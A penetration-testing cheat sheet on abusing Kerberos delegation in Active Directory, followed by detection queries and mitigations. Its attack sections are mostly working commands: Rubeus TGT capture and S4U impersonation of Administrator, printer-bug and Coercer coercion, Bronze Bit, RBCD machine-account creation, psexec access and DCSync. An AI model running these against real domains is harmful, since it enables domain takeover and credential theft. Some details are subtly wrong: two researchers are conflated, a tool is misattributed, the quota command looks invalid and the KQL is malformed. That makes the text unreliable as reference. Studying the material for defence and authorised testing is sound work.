# Kerberos Delegation Abuse

## Overview

Kerberos delegation allows a service to impersonate a user when accessing other resources. This is essential for multi-tier applications (e.g., a web server accessing a database on behalf of the user). However, misconfigured delegation is one of the most commonly exploited AD attack paths.

## Types of Delegation

| Type | Description | Risk Level |
|------|-------------|------------|
| **Unconstrained** | Service can impersonate user to ANY service | CRITICAL |
| **Constrained (S4U2Self + S4U2Proxy)** | Service can impersonate user to SPECIFIC services | HIGH |
| **Resource-Based (RBCD)** | Target service controls who can delegate to it | MEDIUM/HIGH |

## Kerberos Delegation Protocol Extensions

### S4U2Self (Service for User to Self)

Allows a service to obtain a TGS to itself on behalf of a user. This lets the service get a user's authorization data.

```
Service → KDC: TGS-REQ (s4u2self) 
  ├─ TGT (service's own TGT)
  ├─ Options: FORWARDABLE
  └─ Name: user_to_impersonate

KDC → Service: TGS-REP
  └─ Service Ticket (encrypted with service's key)
     ├─ For: user_to_impersonate
     └─ Target: service itself
```

### S4U2Proxy (Service for User to Proxy)

Allows a service to request a TGS to a specified service on behalf of a user.

```
Service → KDC: TGS-REQ (s4u2proxy)
  ├─ TGT (service's TGT)
  ├─ S4U2Self Ticket (from previous step)
  └─ SPN: target_service

KDC → Service: TGS-REP
  └─ Service Ticket (encrypted with target service's key)
     ├─ For: impersonated_user
     └─ Target: target_service
```

## 1. Unconstrained Delegation

When a computer or service account has unconstrained delegation, the KDC includes the user's **TGT** inside the service ticket sent to that service. The service can then extract the TGT and impersonate the user to **any** service.

### Identifying Unconstrained Delegation

```powershell
# PowerView
Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedForDelegation

# AD PowerShell
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# LDAP query
([adsisearcher]"(userAccountControl:1.2.840.113556.1.4.803:=524288)").FindAll()
```

### Exploiting Unconstrained Delegation

```powershell
# On the compromised server with unconstrained delegation
# Monitor for incoming TGTs

# Rubeus - Monitor for TGTs in memory
Rubeus.exe monitor /interval:5 /nowrap

# Wait for a high-value user (Domain Admin) to connect to the server
# Common attack: Printer Bug (MS-RPRN) or Coercer to force auth
```

### Printer Bug (MS-RPRN)

Forces a target server to authenticate back to the attacker's server, leaking its TGT.

```bash
# Impacket - PrinterBug
# Target prints to our malicious printer spooler
SpoolSample.py target_server.domain.local attacker_server.domain.local

# Or with dementor.py (older name)
dementor.py -d domain.local target_server attacker_server
```

```powershell
# On Windows with MS-RPRN abuse
# Various tools: SpoolSample, printerbug, etc.
```

### Coercer (Automated Coercion)

```bash
# Coercer - Force authentication via multiple protocols
Coercer.py -d domain.local -u user -p password --victim target.domain.local --attacker attacker.domain.local
```

### Collecting TGTs with Rubeus

```powershell
# On attacker-controlled server (with unconstrained delegation)
Rubeus.exe monitor /interval:1 /nowrap

# When a DA connects, their TGT appears in the output
# Extract the base64 TGT and use it

# Use TGT immediately
Rubeus.exe asktgs /ticket:BASE64_TGT /service:LDAP/dc.domain.local /ptt

# DCSync with the captured TGT
lsadump::dcsync /domain:domain.local /user:Administrator
```

## 2. Constrained Delegation

Constrained delegation restricts which services the impersonating account can access. The service is configured with `AllowedToDelegateToAccount` or `msDS-AllowedToDelegateTo` attributes listing allowed SPNs.

### Identifying Constrained Delegation

```powershell
# PowerView
Get-DomainUser -TrustedToAuthForDelegation
Get-DomainComputer -TrustedToAuthForDelegation

# Find delegation targets
Get-DomainObject -Identity svc_web | Select msDS-AllowedToDelegateTo

# AD PowerShell
Get-ADUser -Identity svc_web -Properties msDS-AllowedToDelegateTo
Get-ADComputer -Identity web_server -Properties msDS-AllowedToDelegateTo
```

### Exploiting Constrained Delegation

When you compromise a service account with constrained delegation, you can impersonate any user to the allowed services.

```powershell
# Rubeus - S4U exploit
Rubeus.exe s4u /user:svc_web /rc4:SERVICE_HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt

# With alternate service (Bronze Bit / s4u2proxy + alt)
Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target /altservice:host,ldap /ptt

# Request TGS for multiple services
Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target /altservice:* /ptt
```

```bash
# Impacket getST.py
getST.py domain.local/svc_web:Password123 -spn cifs/target.domain.local -impersonate Administrator -dc-ip 192.168.1.10

# Use the ticket
export KRB5CCNAME=Administrator.ccache
smbexec.py -k -no-pass domain.local/Administrator@target.domain.local
```

```bash
# With AES key
getST.py -aesKey AES256_KEY domain.local/svc_web -spn cifs/target -impersonate Administrator -dc-ip 192.168.1.10
```

### Bronze Bit (CVE-2020-17049)

**Vulnerability in S4U2Proxy**: Windows servers don't properly validate the `forwardable` flag in the S4U2Self ticket when performing S4U2Proxy, allowing impersonation even when constrained delegation should block it.

```powershell
# Rubeus Bronze Bit exploit
Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target /bronzebit /ptt
```

**Patched**: November 2020 Patch Tuesday (KB4586786, etc.)
**Workaround**: `EnabledForDelegation` must be set on the front-end service account.

## 3. Resource-Based Constrained Delegation (RBCD)

RBCD reverses the delegation model: instead of the service specifying who it can delegate to, **the target resource** specifies who can delegate to it (via `msDS-AllowedToActOnBehalfOfOtherIdentity`).

This is exploitable when an attacker has `GenericWrite`/`GenericAll` rights on a computer object.

### RBCD Attack Flow

```
1. Attacker has GenericWrite on target computer
2. Attacker creates a computer account (or uses existing)
3. Attacker sets msDS-AllowedToActOnBehalfOfOtherIdentity
   on the target to include the controlled account
4. Attacker uses S4U to request a ticket as any user to the target
```

### Executing RBCD Attack

```bash
# Create a new machine account
impacket-addcomputer.py domain.local/user:password -dc-ip 192.168.1.10 -computer-name FAKEPC$ -computer-pass FakePass

# Or use impacket's rbcd.py
rbcd.py -action write -delegation-type rbcd -delegate-to "target$" -delegate-from "fakepc$" domain.local/user:password
```

```powershell
# PowerView - RBCD
# Add RBCD for our controlled account on the target
Set-DomainRBCD -Identity target_computer -DelegateFrom 'fakepc$' -Verbose

# Create a machine account with PowerMad or standalone
# (Requires MachineAccountQuota > 0 - default is 10)
```

```bash
# After setting RBCD, request a ticket
getST.py domain.local/FAKEPC\$:FakePass -spn cifs/target.domain.local -impersonate Administrator -dc-ip 192.168.1.10

# Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@target.domain.local
```

### PowerView RBCD

```powershell
# Check current RBCD permissions
Get-DomainRBCD -Identity target_computer

# Set RBCD
Set-DomainRBCD -Identity target_computer -DelegateFrom 'fakepc$'

# Remove RBCD (cleanup)
Set-DomainRBCD -Identity target_computer -DelegateFrom $null
```

## Finding Delegation Targets

### PowerView

```powershell
# Find all users/computer with delegation
Get-DomainUser -TrustedForDelegation
Get-DomainComputer -TrustedForDelegation
Get-DomainUser -TrustedToAuthForDelegation
Get-DomainComputer -TrustedToAuthForDelegation

# Find computers where we can modify RBCD
Get-DomainObjectAcl -Identity target_computer | Where-Object { $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteProperty" }
```

### BloodHound

```
# Neo4j queries for delegation abuse paths
MATCH p = (c:Computer)-[:AllowedToDelegate]->(t:Computer) RETURN p
MATCH p = (m:User)-[:MemberOf]->(:Group)-[:AllowedToDelegate]->(t:Computer) RETURN p
MATCH p = (c:Computer)-[:AddAllowedToAct]->(t:Computer) WHERE c.name <> t.name RETURN p
MATCH (u:User {admincount:true}) MATCH (c:Computer) RETURN u, c
```

## OPSEC Considerations

| Aspect | Consideration |
|--------|---------------|
| **S4U2Self usage** | TGS-REQ with S4U2Self generates event 4769 with unusual flags |
| **Fowardable flag** | RBCD requires forwardable tickets; some configs block this |
| **New machine accounts** | Creating machine accounts triggers event 4741 (computer created) |
| **Attribute modification** | Modifying `msDS-AllowedToActOnBehalfOfOtherIdentity` triggers event 5136 |
| **RBCD target** | The target computer must be domain-joined and enabled |
| **Time sensitivity** | Tickets expire; must use within validity window |
| **Impersonated user** | Must exist and be enabled |
| **Service type** | `host` service gives WinRM/RDP; `cifs` gives SMB; `ldap` gives DCSync on DC |

### Coercion OPSEC

```bash
# Printer Bug / SpoolSample generates event:
# - 5156: Windows Filtering Platform allowed connection
# - Event ID 8089: Print Spooler (less common)
# - LDAP connections from target to attacker

# Mitigation: Monitor for RPC calls to spoolss
# Block outbound RPC to untrusted networks
```

## Detection

### Event 4769 - TGS Requested

For delegation abuse look for:
- **S4U2Self**: Ticket options include `forwardable` flag (0x400000)
- **S4U2Proxy**: Ticket references an existing service ticket as evidence
- **Delegation flag**: `Delegated` is set in the ticket option
- **Transited services**: Shows the delegation chain

```kusto
// KQL - Detect S4U2Proxy usage
EventID: 4769
| where TicketOptions contains "forwardable"
| where TransitedServices != ""
| where ServiceName != "krbtgt"
```

### Event 5136 - Directory Service Changes

For RBCD abuse:
```kusto
// KQL - Detect RBCD attribute change
EventID: 5136
| where AttributeLDAPDisplayName == "msDS-AllowedToActOnBehalfOfOtherIdentity"
| project TimeGenerated, AccountName, ObjectDN, AttributeValue
```

### Event 4741 - Computer Account Created

```kusto
// KQL - Detect new computer account creation (pre-RBCD)
EventID: 4741
| where AccountName contains "FAKE" or AccountName contains "STOLEN"
```

### Additional Events

| Event ID | Description | Timing |
|----------|-------------|--------|
| 4768 | TGT requested (service's TGT) | Pre-S4U |
| 4769 | TGS requested (S4U2Self/S4U2Proxy) | During |
| 4741 | Computer account created | Pre-RBCD |
| 5136 | `msDS-AllowedToActOnBehalfOfOtherIdentity` modified | Pre-RBCD |
| 4662 | Any AD object access | Varies |
| 5156 | Connection allowed (Printer Bug) | During coercion |

### BloodHound Detection

- Look for unexpected delegation paths (low-priv user → high-value target via RBCD)
- Monitor for `AddAllowedToAct` edges appearing suddenly
- Track new computer accounts with no domain-join metadata

## Mitigations

1. **Avoid unconstrained delegation** - Highest risk delegation type
2. **Use constrained delegation with protocol transition** only when absolutely necessary
3. **Protect accounts that can modify delegation attributes** (GenericWrite/GenericAll)
4. **Low `MachineAccountQuota`** (default 10) - Reduce to 0 if not needed:
   ```powershell
   # Set MachineAccountQuota to 0
   net dom account /quota:0
   ```
5. **Enable Kerberos armoring (FAST)** - Protects TGTs from theft during delegation
6. **Protect high-value accounts** in the Protected Users group
7. **Monitor `msDS-AllowedToActOnBehalfOfOtherIdentity`** modifications
8. **Disable Print Spooler** on DCs and non-print servers:
   ```powershell
   # Disable Print Spooler service
   Set-Service -Name Spooler -StartupType Disabled
   ```
9. **Apply KB4586786** (Bronze Bit patch - November 2020)
10. **Use Group Policy** to restrict unconstrained delegation to trusted servers only

## References

- MS-S4U: Service for User (S4U) Protocol
- MS-PAC: Privilege Attribute Certificate Structure
- MS-RPRN: Print System Remote Protocol
- CVE-2020-17049 (Bronze Bit)
- Elad Shamir - "Wagging the Dog" (resource-based constrained delegation research)
- Lee Christensen (Will Schroeder) - Delegation research and Rubeus
- dirkjanm - RBCD research and Impacket implementation
